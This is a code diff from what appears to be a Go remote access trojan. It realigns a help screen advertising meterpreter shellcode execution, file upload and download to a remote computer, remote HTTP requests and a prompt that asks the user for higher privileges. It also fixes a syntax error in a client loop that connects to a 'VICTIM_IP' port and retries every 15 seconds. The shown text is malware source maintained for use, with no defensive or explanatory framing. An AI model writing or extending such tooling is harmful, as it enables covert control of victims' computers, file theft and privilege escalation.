@@ -557,7 +557,7 @@ func HELP_SCREEN_LINUX() {
   color.Yellow("|   [ COMMAND ]                                       [DESCRIPTION]                                 |")
   color.Yellow("|  ===================================              ======================================          |")
   color.Yellow("|                                                                                                   |")
-  color.Yellow("|   (*) £METERPRETER -C \"powershell shellcode\"  This command executes given powershell        |")
+  color.Yellow("|   (*) £METERPRETER -C \"powershell shellcode\"    This command executes given powershell        |")
   color.Yellow("|                                                      shellcode for metasploit integration.        |")
   color.Yellow("|                                                                                                   |")
   color.Yellow("|                                                                                                   |")
@@ -569,7 +569,7 @@ func HELP_SCREEN_LINUX() {
   color.Yellow("|                                                       shell shellcode on remote machine.          |")
   color.Yellow("|                                                                                                   |")
   color.Yellow("|                                                                                                   |")
-  color.Yellow("|   (*) £UPLOAD -F \"filename.exe\":              This command uploads a choosen file to        |")
+  color.Yellow("|   (*) £UPLOAD -F \"filename.exe\":                This command uploads a choosen file to        |")
   color.Yellow("|                                                       remote computer via tcp socket stream.      |")
   color.Yellow("|                                                                                                   |")
   color.Yellow("|                                                                                                   |")
@@ -577,15 +577,15 @@ func HELP_SCREEN_LINUX() {
   color.Yellow("|                                                       remote computer via http get method.        |")
   color.Yellow("|                                                                                                   |")
   color.Yellow("|                                                                                                   |")
-  color.Yellow("|   (*) £DOWNLOAD -F \"filename.exe\":             This command download a choosen file          |")
+  color.Yellow("|   (*) £DOWNLOAD -F \"filename.exe\":              This command download a choosen file          |")
   color.Yellow("|                                                       from remote computer via tcp socket stream. |")
   color.Yellow("|                                                                                                   |")
   color.Yellow("|                                                                                                   |")
-  color.Yellow("|   (*) £REQUEST -A \"www.site.com\":             This command sends a http get request on      |")
+  color.Yellow("|   (*) £REQUEST -A \"www.site.com\":               This command sends a http get request on      |")
   color.Yellow("|                                                       remote machine to given addres.             |")
   color.Yellow("|                                                                                                   |")
   color.Yellow("|                                                                                                   |")
-  color.Yellow("|   (*) £PLEASE \"any command\":                  This command asks users comfirmation for      |")
+  color.Yellow("|   (*) £PLEASE \"any command\":                    This command asks users comfirmation for      |")
   color.Yellow("|                                                       higher privilidge operations.               |")
   color.Yellow("|                                                                                                   |")
   color.Yellow("|                                                                                                   |")
@@ -898,7 +898,7 @@ const VICTIM_IP string = "127.0.0.1";
 const VICTIM_PORT string = "8552";
 
 func main(){
-    connect, err :=net.Dial("tcp",VICTIM_IP+":"+VICTIM_PORT");
+    connect, err :=net.Dial("tcp",VICTIM_IP+":"+VICTIM_PORT);
     if err != nil {                                                                                           
       time.Sleep(15*time.Second);                                                             
       main();                                    
